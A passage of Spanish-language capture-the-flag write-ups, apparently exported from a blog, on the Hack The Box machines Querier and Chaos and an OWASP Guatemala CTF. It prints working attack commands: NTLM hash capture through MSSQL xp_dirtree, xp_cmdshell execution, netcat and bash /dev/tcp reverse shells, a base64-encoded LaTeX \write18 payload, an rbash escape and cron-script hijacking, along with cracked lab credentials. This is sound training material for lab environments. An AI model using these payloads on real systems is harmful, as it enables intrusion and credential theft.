Database\n1 2 3 4 5 6 7 8 9 10  python mssqlclient.py -p 1433 -windows-auth -debug reporting:\u0026#39;PcwTWTHRwryjc$c6\u0026#39;@10.10.10.125 SQL\u0026gt; SELECT name FROM master.dbo.sysdatabases name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb volume   MSSQL OOB Enumerando las diferentes bases de datos no encontramos ningun tipo de usuario y contraseña que nos pudiesen ayudar para conectarnos con otro usuario, asi mismo la ejecucion de comandos no esta permitida para nuestro usuario reporting. Pero el usuario si esta permitido para ejecutar xp_fileexist y xp_dirtree, por lo que aprovechando estos podemos hacer Out-of-Band. Se utilizo smbserver.py de forma local para crear un servidor samba y con mssqlclient.py se ejecuto el comando para hacer una \u0026lsquo;consulta\u0026rsquo; hacia nuestra maquina y asi obtener las contraseñas.\n1 2  exec master..xp_fileexist \u0026#39;\\10.10.12.75\\pwn\u0026#39; -- - declare @q varchar(99);set @q=\u0026#39;\\\\10.10.14.23\\test\u0026#39;;exec master.dbo.xp_dirtree @q HTTP/1.1   LOCAL 1  python smbserver.py -smb2support -port 445 -ip 10.10.12.220 Me /tmp/me   REMOTE 1  EXEC MASTER.sys.xp_dirtree \u0026#39;\\\\10.10.12.220\\Me\u0026#39;, 1, 1   CAPTURE MSSQL CREDENTIALS WITH SMBSERVER\nHashcat Utilizamos hashcat para desencriptar.\n1 2 3  ./hashcat64.bin -m 5600 -o querier.txt ntlm.txt ../rockyou.txt mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000   DECRYPTED 1  MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568   USER - FLAG 1  python mssqlclient.py -p 1433 -windows-auth -debug MSSQL-SVC:\u0026#39;corporate568\u0026#39;@10.10.10.125   Ya que obtuvimos usuario y contraseña de podemos utilizarlos y activar xp_cmdshell para ejecutar comando dentro de la computadora.\n1  EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1; EXEC sp_configure reconfigure; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;EXEC sp_configure reconfigure;   Ejecutando comandos, leyendo el flag user.txt.\n1 2 3 4  EXEC master.dbo.xp_cmdshell \u0026#39;more C:\\Users\\mssql-svc\\Desktop\\user.txt\u0026#39;; output -------------------------------------- c37b41bb669da345bb14de50faab3c16   SHELL INVERSA - NETCAT Utilizando powershell para descargar nc.exe (netcat) en la computadora.\n1  EXEC master.dbo.xp_cmdshell \u0026#39;powershell -command \u0026#34;\u0026amp; { iwr 10.10.12.33/nc.exe -OutFile C:\\Users\\mssql-svc\\Desktop\\nc.exe }\u0026#34;\u0026#39;;   Utilizando nc.exe (netcat) para conectarnos de forma inversa a nuestro puerto local\n1  EXEC master.dbo.xp_cmdshell \u0026#39;C:\\Users\\mssql-svc\\Desktop\\nc.exe -e cmd 10.10.12.33 7878\u0026#39;;   Local 1  nc -lvp 7878   PRIVILEGE ESCALATION Estando dentro de la maquina como MSSQL-SVC procedemos a hacer una enumeracion con PowerUp el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.\nPowerUp Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.\nPowerUp.ps1\n1 2  powershell -command \u0026#34;\u0026amp; { iwr 10.10.12.33/power.ps1 -OutFile C:\\Users\\mssql-svc\\Desktop\\power.ps1 }\u0026#34; Import-Module .\\power.ps1   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  Invoke-AllChecks | Out-File -Encoding ASCII checks.txt [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... [*] Checking service executable and argument permissions... [*] Checking service permissions... [*] Checking %PATH% for potentially hijackable DLL locations... ModifiablePath : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps IdentityReference : QUERIER\\mssql-svc Permissions : {WriteOwner, Delete, WriteAttributes, Synchronize...} %PATH% : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps AbuseFunction : Write-HijackDll -DllPath \u0026#39;C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps\\wlbsctrl.dll\u0026#39; [*] Checking for AlwaysInstallElevated registry key... [*] Checking for Autologon credentials in registry... [*] Checking for modifidable registry autoruns and configs... [*] Checking for modifiable schtask files/configs... [*] Checking for unattended install files... UnattendPath : C:\\Windows\\Panther\\Unattend.xml [*] Checking for encrypted web.config strings... [*] Checking for encrypted application pool and virtual directory passwords... [*] Checking for plaintext passwords in McAfee SiteList.xml files.... [*] Checking for cached Group Policy Preferences .xml files.... Changed : {2019-01-28 23:12:48} UserNames : {Administrator} NewName : [BLANK] Passwords : {MyUnclesAreMarioAndLuigi!!1!} File : C:\\ProgramData\\Microsoft\\Group  Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml   Al finalizar Nos encontramos que existe un archivo de Groups Policy que contiene un Usuario y Contraseña, en este caso el de Administrator. Utilizando el script psexec.py para conectarnos de manera remota con el Usuario Administrator y obtener una shell con nt authority\\system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  python psexec.py -debug Administrator:\u0026#39;MyUnclesAreMarioAndLuigi!!1!\u0026#39;@10.10.10.125 root@sckull:~/impacket/examples# python psexec.py -debug Administrator:\u0026#39;MyUnclesAreMarioAndLuigi!!1!\u0026#39;@10.10.10.125 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies [+] StringBinding ncacn_np:10.10.10.125[\\pipe\\svcctl] [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [*] Requesting shares on 10.10.10.125..... [*] Found writable share ADMIN$ [*] Uploading file WsaCFcep.exe [*] Opening SVCManager on 10.10.10.125..... [*] Creating service EOzc on 10.10.10.125..... [*] Starting service EOzc..... [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [!] Press help for extra shell commands [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto Microsoft Windows [Version 10.0.17763.292] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;cd .. C:\\Windows\u0026gt;cd C:\\  C:\\\u0026gt;cd Users\\Administrator C:\\Users\\Administrator\u0026gt;cd Desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is FE98-F373 Directory of C:\\Users\\Administrator\\Desktop 01/29/2019 12:04 AM \u0026lt;DIR\u0026gt; . 01/29/2019 12:04 AM \u0026lt;DIR\u0026gt; .. 01/28/2019 12:08 AM 33 root.txt 1 File(s) 33 bytes 2 Dir(s) 5,970,571,264 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;more root.txt b19c3794f786a1fdcf205f81497c3592   ","description":"Querier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa. Tras ejecutar PowerUp encontramos credenciales las cuales utilizamos en PSexec para obtener privilegios de administrador.","id":147,"section":"posts","tags":["smbclient","binwalk","mssql","impacket","powerup"],"title":"Hack The Box - Querier","uri":"https://sckull.github.io/posts/querier/"},{"content":"  Chaos expone WordPress donde desbloqueamos un post con informacion de WPScan, dicho post presenta credenciales que nos dieron acceso al puerto IMAP, encontramos un correo encriptado el cual nos guió a pdfTEXT (LaTex) donde explotamos un RCE y escapamos de una shell limitada. Contraseñas guardadas en el directorio Firefox nos permitió escalar privilegios.\nInformacion de la Maquina    Nombre Chaos      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.120   Maker felamos    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.6, 4.4, 4.1, 5.9, 5.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[10, 8, 1, 9, 2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.10.120 Discovered open port 10000/udp on 10.10.10.120 Discovered open port 110/tcp on 10.10.10.120 Discovered open port 143/tcp on 10.10.10.120 Discovered open port 995/tcp on 10.10.10.120 Discovered open port 993/tcp on 10.10.10.120   Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.120 Host is up (0.093s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.34 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd (Ubuntu) 993/tcp open ssl/imap Dovecot imapd (Ubuntu) 995/tcp open ssl/pop3 Dovecot pop3d 10000/tcp open http MiniServ 1.890 (Webmin httpd) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.15 seconds   HTTP Al visitar la pagina en el puerto 80 nos muestra un mensaje Direct IP not allowed.\nWFUZZ Escaneo de directorios con WFUZZ y el wordlist common.txt, nos encontramos con un directorio /wp.\n1 2 3 4 5 6 7 8 9 10 11 12  Target: http://10.10.10.120/FUZZ Total requests: 4588 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000001: C=200 1 L\t5 W\t73 Ch\t\u0026#34;\u0026#34; 001994: C=200 1 L\t5 W\t73 Ch\t\u0026#34;index.html\u0026#34; 002119: C=301 9 L\t28 W\t317 Ch\t\u0026#34;javascript\u0026#34; 003562: C=403 11 L\t32 W\t300 Ch\t\u0026#34;server-status\u0026#34; 004458: C=301 9 L\t28 W\t309 Ch\t\u0026#34;wp\u0026#34;   Realizamos un escaneo por segunda vez al directorio /wp.\n1 2 3 4 5 6 7 8 9  Target: http://10.10.10.120/wp/FUZZ Total requests: 4588 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000001: C=200 16 L\t60 W\t933 Ch\t\u0026#34;\u0026#34; 004445: C=301 9 L\t28 W\t319 Ch\t\u0026#34;wordpress\u0026#34;   /wp/wordpress Al visitar la ruta http://10.10.10.120/wp/wordpress/ nos muestra una pagina en wordpress, y un post en el que nos indica que para poder ver el contenido del mismo necesitamos ingresar la contraseña.\nObtuvimos la contraseña por medio de la herramienta WPSCAN, la contraseña con la que pudimos desbloquear el post fue un usuario (human) que encontramos con WPSCAN.\nWPSCAN - Users Credenciales:\n1 2  username – ayush password – jiujitsu   Las credenciales que nos muestran son las de webmail.\nHTTP - PUERTO 10000 Al visitar este puerto nos muestra una pagina con un mensaje y una url, agregamos chaos a nuestro archivo /etc/hosts con la IP de la maquina.\n1 2  # [/etc/hosts] 10.10.10.120\tchaos   Al visitar https://chaos:10000/ nos muestra el weblogin al cual se refiere el mensaje de las credenciales.\nIgualmente podemos acceder direcatamente con la IP utilizando https.\nAl intentar iniciar sesion con las credenciales que encontramos nos muestra un error, al parecer no son las credenciales para el weblogin.\nIMAP - Puerto 993 Utilizamos openssl para poder conectarnos con el puerto 993 y poder obtener un poco de informacion en este servicio corriendo en la maquina, utilizamos las credenciales para poder hacer un login.\nEn la carpeta o seccion de Drafts encontramos un correo existente aun.\nAl leer el correo nos muestra un mensaje que nos habla sobre dos archivos adjuntos al correo.\n1 2 3 4 5 6  Hii, sahayCheck the enmsg.txtYou are the password XD.Also attached the script which i used to encrypt.Thanks,Ayush  Primer archivo:\n1  MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=  Segundo archivo:\n1  ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBvdXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdldHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikKCiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVua3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgogICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5rKSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdlc3QoKQoK  Comandos Utilizados:\n1 2 3 4 5 6  openssl s_client -connect 10.10.10.120:993 a login ayush jiujitsu a select Drafts UID FETCH 1 (BODY[0]) UID FETCH 1 (BODY[2]) \u0026lt;-- Lectura del primer archivo UID FETCH 1 (BODY[3]) \u0026lt;-- Lectura del segundo archivo   El primer archivo pertenece a enmsg.txt y el segundo al archivo que encriptó enmsg.txt.\nAhora que tenemos el archivo de encriptacion podemos escribir algunas funciones para poder desencriptar el archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  import os, random from Crypto.Cipher import AES from Crypto.Hash import SHA256 def decrypt(key, filename): chunksize = 64*1024 outputFile = \u0026#39;dec\u0026#39; with open(filename, \u0026#39;rb\u0026#39;) as infile: filesize = long(infile.read(16)) IV = infile.read(16) decryptor = AES.new(key, AES.MODE_CBC, IV) with open(outputFile, \u0026#39;wb\u0026#39;) as outfile: while True: chunk = infile.read(chunksize) if len(chunk) == 0: break outfile.write(decryptor.decrypt(chunk)) outfile.truncate(filesize) def getKey(password): hasher = SHA256.new(password) return hasher.digest() def Main(): filename = \u0026#39;/path/to/file/file_enc\u0026#39; password = \u0026#39;sahay\u0026#39; decrypt(getKey(password), filename) print(\u0026#34;Done.\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: Main()   Al ejecutar nuestro escript nos muestra un mensaje en base64 este mismo lo decodificamos y nos muestra un segundo mensaje que nos habla de un servicio de pdf y una url donde este se encuentra.\n1 2 3 4 5 6 7 8 9 10  Hii Sahay Please check our new service which create pdf p.s - As you told me to encrypt important msg, i did :) http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3 Thanks, Ayush   Agregamos el nuevo dominio a nuestro archivo /etc/hosts.\n1 2  # [/etc/hosts] 10.10.10.120\tchaos.htb   RCE - pdfTEXT [LaTex] Al visitar la url del mensaje nos muestra lo que parece ser un servicio de creacion de PDF, al enviar un texto con el Template test1 nos muestra en la parte de respuesta en este caso en el METODO POST, la version de pdfTEXT. Investigamos un poco acerca de este servicio y encontramos un post que habla de una vulnerabilidad en los compiladores basados en LaTex, en el cual se pueden ejecutar comandos en el servidor donde este corriendo un servicio basado en este.\n hacking-with-latex  Utilizamos el siguiente payload y un comando para comprobar que estos se ejecutan en la maquina, se envio por medio del Template test3:\nPayload:\n1  \\immediate\\write18{#ComandoAqui}  Comando:\n1  nslookup sckull.htb 10.10.13.27   Responder:\nAhora que tenemos un \u0026lsquo;pequeño\u0026rsquo; acceso mediante ejecucion de comandos, vamos a descargar un archivo que contiene una shell inversa para ejecutarlo y obtener acceso.\nShell:\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.13.27 7878 \u0026gt;/tmp/f   Codificamos a base64:\n1  cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg==   Payload:\n1  \\immediate\\write18{echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg==|base64 -d \u0026gt; shell.sh \u0026amp;\u0026amp; sh shell.sh}  Al enviar este mensaje la maquina decodifica nuestra shell y la agrega a un archivo (shell.sh) luego de esto la ejecuta y obtenemos nuestra shell como usuario www-data.\nActualizamos nuestra shell con python, al intentar ingresar al directorio de ayush nos dice permiso denegado, anteriormente encontramos una contraseña para ayush utilizamos la misma para poder escalar a ese usuario mediante el comando su, pero al intentar ingresar a su carpeta principal nos muestra que cd esta restringido.\nPara poder escapar este mensaje o rbash utilizamos tar:\n1  tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash   Tambien agregamos a la variable PATH:\n1  export PATH=/usr/bin:/bin   Al realizar todo esto podemos ingresar a la carpeta de ayush y obtener nuestra bandera user.txt.\nPRIVILEGE ESCALATION Hicimos una pequeña enumeracion en los directorios de Ayush y encontramos una carpeta de .mozilla que pertenece a el navegador firefox, revisamos los archivos que contiene esta carpeta y encontramos el archivo login.json que almacena las contraseñas de firefox.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  { \u0026#34;nextId\u0026#34;:3, \u0026#34;logins\u0026#34;:[ { \u0026#34;id\u0026#34;:2, \u0026#34;hostname\u0026#34;:\u0026#34;https://chaos.htb:10000\u0026#34;, \u0026#34;httpRealm\u0026#34;:null, \u0026#34;formSubmitURL\u0026#34;:\u0026#34;https://chaos.htb:10000\u0026#34;, \u0026#34;usernameField\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;passwordField\u0026#34;:\u0026#34;pass\u0026#34;, \u0026#34;encryptedUsername\u0026#34;:\u0026#34;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==\u0026#34;, \u0026#34;encryptedPassword\u0026#34;:\u0026#34;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb\u0026#34;, \u0026#34;guid\u0026#34;:\u0026#34;{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}\u0026#34;, \u0026#34;encType\u0026#34;:1, \u0026#34;timeCreated\u0026#34;:1540642202692, \u0026#34;timeLastUsed\u0026#34;:1540642202692, \u0026#34;timePasswordChanged\u0026#34;:1540642202692, \u0026#34;timesUsed\u0026#34;:1 } ], \u0026#34;disabledHosts\u0026#34;:[ ], \u0026#34;version\u0026#34;:2 }   Para poder obtener el usuario y contraseña de este archivo utilizamos firefox_decrypt, lo descargamos en la maquina y lo ejecutamos, al ejecutarlo nos pide la contraseña para el usuario ayush la ingresamos (jiujitsu), luego de eso nos muestra el usuario y contraseña en ese archivo.\n1 2 3  Website: https://chaos.htb:10000 Username: \u0026#39;root\u0026#39; Password: \u0026#39;Thiv8wrej~\u0026#39;   Escalamos con el usuario root y contraseña, obteniendo privilegios root y nuestra bandera root.txt.\n","description":"Chaos expone WordPress donde desbloqueamos un post con informacion de WPScan, dicho post presenta credenciales que nos dieron acceso al puerto IMAP, encontramos un correo encriptado el cual nos guió a pdfTEXT (LaTex) donde explotamos un RCE y escapamos de una shell limitada. Contraseñas guardadas en el directorio Firefox nos permitió escalar privilegios.","id":148,"section":"posts","tags":["wpscan","webmin","imap","pdfTEXT","laTex","DNS exfil","tar","firefox"],"title":"Hack The Box - Chaos","uri":"https://sckull.github.io/posts/chaos/"},{"content":"  OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.txt de las diferentes maquinas Windows y Linux presentadas por los organizadores.\nINFRAESTRUCTURA 1 NMAP Escaneo de puertos/version/sistema operativo con nmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 02:46 CDT Nmap scan report for 192.168.1.15 Host is up (0.00094s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds MAC Address: 00:0C:29:87:DA:AB (VMware) Device type: general purpose Running: Microsoft Windows XP OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3 OS details: Microsoft Windows XP SP2 or SP3 Network Distance: 1 hop Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds   METASPLOIT Utilizamos el exploit netapi para windows xp contra el sistema operativo.\nSHELL Obtenemos permisos de administrador y nuestra flag en el Escritorio.\nflag.txt: flag{w1nd0ws_n3tap1_3xplo1t}\nINFRAESTRUCTURA 2 NMAP Escaneo de puertos tcp/version/sistema con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 03:54 CDT Nmap scan report for 192.168.1.14 Host is up (0.00088s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.10 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.10 MAC Address: 00:0C:29:AB:85:8F (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.88 ms 192.168.1.14 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds.   Puerto 8009 Nos muestra un error de conexion.\nHTTP En el puerto 8080 nos muestra una pagina corriendo en tomcat.\nUtilizamos el panel de control para obtener acceso. Siempre probamos las contraseñas comunes o por default de alguna plataforma para ver si logramos obtener accesso, este es el caso de esta maquina.\n1 2  user: tomcat pass: s3cret   Ahora tenemos acceso al panel de control de tomcat, podemos subir una shell/payload con extension war.\nCreamos nuestra reverse shell o payload con msfvenom y configuramos metasploit para poder obtener una sesion o shell por medio del payload.\nSubimos nuestro archivo en el panel de control en a parte de \u0026lsquo;WAR file to deploy\u0026rsquo;.\nPara ejecutar nuestra shell solo buscamos en la lista que nos aparece por encima y basta con darle click para que se habra una sesion en metasploit.\nMetasploit Actualizamos nuestra shell con python3.\nEstando dentro obtenemos nuestra bandera en la carpeta principal del usuario retoinfra1.\nuser.txt:flag{t0mcat_fa1_cr3dent1als}\nPRIVILEGE ESCALATION Utilizndo pspy encontramos un cronjob que se ejecuta cada minuto y ejecuta un archivo sh en /home/retoinfra1/script.sh.\nYa que podemos editar el archivo y se ejecuta cada minuto vamos a modificar el script.sh para obtener una shell inversa, agregamos una linea de comando que nos permite obtener una shell inversa.\n1  echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.10/7878 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; script.sh   Ponemos a la escucha nuestro puerto en netcat, esperamos y obtenemos nuestra shell inversa como usuario root.\nroot.txt:flag{cr0n_fa1l_bash_scr1pt}\nINFRAESTRUCTURA 3 NMAP Escaneo de puertos tcp con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13  Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 03:17 CDT Nmap scan report for 192.168.1.21 Host is up (0.000077s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.5p1 Ubuntu 10ubuntu0.1 (Ubuntu Linux; protocol 2.0) 5355/tcp open llmnr? 10000/tcp open tcpwrapped MAC Address: 00:0C:29:85:13:94 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 142.49 seconds   PUERTO 10000 NETCAT - PUERTO 10000 EJECUTANDO comandos - NETCAT 10000 http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html\nAl pasarle una cadena de texto al \u0026lsquo;input\u0026rsquo; este lo evalua, si le pasamos la siguiente linea de codigo \u0026quot;__import__('os').system('id')\u0026quot; lo va ejecutar.\nEncontramos unas credenciales, para poder verlas utilizamos \u0026quot;__import__('os').system('cat credentials.txt')\u0026quot;\ncredentials.txt\n1 2  user: retoinfra2 password: 1337hackme!   Nos logeamos por medio de SSH con las credenciales que encontramos.\nEncontramos el archivo ping que nos mostraba en el navegador:\n1 2 3 4 5 6 7 8  #!/usr/bin/python import time, random num_packets = int(input(\u0026#39; Please enther number of packets: \u0026#39;)) print \u0026#39;\u0026#39; print \u0026#39;PING localhost (127.0.0.1) 56(84) bytes of data\u0026#39; for i in range(num_packets): time.sleep(1) print \u0026#39;64 bytes from localhost (127.0.0.1): icmp_seq={} ttl=64 time=0.0{} ms\u0026#39;.format(i+1, int(random.random() * 100))   Tambien con nuestro 